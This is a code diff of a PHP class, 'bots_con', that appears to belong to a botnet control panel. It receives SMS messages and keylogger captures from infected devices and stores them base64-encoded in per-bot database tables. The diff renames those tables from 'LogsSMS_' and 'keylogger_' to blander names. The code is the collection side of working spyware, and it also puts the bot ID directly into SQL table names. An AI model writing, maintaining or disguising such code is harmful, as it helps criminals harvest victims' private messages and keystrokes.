@@ -447,7 +447,7 @@ class bots_con
       $dateToServer = date('Y-m-d H:i');
       $connection = self::Connection();
       $connection->exec('SET NAMES utf8');
-      $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'LogsSMS_$idbot'";
+      $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'sms_logs_$idbot'";
       $statement = $connection->prepare($sql);
       $statement->execute(array());
       $tableCount = $statement->fetchColumn();
@@ -455,7 +455,7 @@ class bots_con
       $arrayLogs = explode("::endLog::", $logs);
       if ($tableCount != 0) {
         $isTableLogs = true;
-        $statement = $connection->prepare("SELECT ID FROM LogsSMS_$idbot LIMIT 1");
+        $statement = $connection->prepare("SELECT ID FROM sms_logs_$idbot LIMIT 1");
         $statement->execute(array());
         //$arrayLogs = explode("::endLog::", $logs);
 
@@ -463,7 +463,7 @@ class bots_con
           foreach ($arrayLogs as $log) {
             if (strlen($log) > 4) {
               $log = base64_encode(str_replace("::endLog::", "", $log));
-              $statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
+              $statement = $connection->prepare("insert into sms_logs_$idbot (logs, datetoserver, datetodevice)
 						value (?,?,?)");
               $statement->execute(array($log, $dateToServer, $dateToDevice));
             }
@@ -472,13 +472,13 @@ class bots_con
         }
       }
       if (!$isTableLogs) {
-        $statement = $connection->prepare("CREATE TABLE `LogsSMS_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, `datetoserver` VARCHAR(25) NOT NULL,`datetodevice` VARCHAR(25) NOT NULL, PRIMARY KEY (`ID`)) ");
+        $statement = $connection->prepare("CREATE TABLE `sms_logs_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, `datetoserver` VARCHAR(25) NOT NULL,`datetodevice` VARCHAR(25) NOT NULL, PRIMARY KEY (`ID`)) ");
         $statement->execute(array());
 
         foreach ($arrayLogs as $log) {
           if (strlen($log) > 4) {
             $log = base64_encode(str_replace("::endLog::", "", $log));
-            $statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
+            $statement = $connection->prepare("insert into sms_logs_$idbot (logs, datetoserver, datetodevice)
 						value (?,?,?)");
             $statement->execute(array($log, $dateToServer, $dateToDevice));
           }
@@ -547,21 +547,21 @@ class bots_con
       $connection = self::Connection();
       $connection->exec('SET NAMES utf8');
       $isTableLogs = false;
-      $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'keylogger_$idbot'";
+      $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'key_logs_$idbot'";
       $statement = $connection->prepare($sql);
       $statement->execute(array());
       $tableCount = $statement->fetchColumn();
       $arrayLogs = explode(":endlog:", $logs);
       if ($tableCount != 0) {
         $isTableLogs = true;
-        $statement = $connection->prepare("SELECT ID FROM keylogger_$idbot LIMIT 1");
+        $statement = $connection->prepare("SELECT ID FROM key_logs_$idbot LIMIT 1");
         $statement->execute(array());
         //$arrayLogs = explode(":endlog:", $logs);
         foreach ($statement as $row) {
           foreach ($arrayLogs as $log) {
             if (strlen($log) > 4) {
               $log = base64_encode(str_replace(":endlog:", "", $log));
-              $statement = $connection->prepare("insert into keylogger_$idbot (logs) value (?)");
+              $statement = $connection->prepare("insert into key_logs_$idbot (logs) value (?)");
               $statement->execute(array($log));
             }
           }
@@ -569,13 +569,13 @@ class bots_con
         }
       }
       if (!$isTableLogs) {
-        $statement = $connection->prepare("CREATE TABLE `keylogger_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(12000) NOT NULL, PRIMARY KEY (`ID`)) ");
+        $statement = $connection->prepare("CREATE TABLE `key_logs_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(12000) NOT NULL, PRIMARY KEY (`ID`)) ");
         $statement->execute(array());
 
         foreach ($arrayLogs as $log) {
           if (strlen($log) > 4) {
             $log = base64_encode(str_replace(":endlog:", "", $log));
-            $statement = $connection->prepare("insert into keylogger_$idbot (logs) value (?)");
+            $statement = $connection->prepare("insert into key_logs_$idbot (logs) value (?)");
             $statement->execute(array($log));
           }
         }
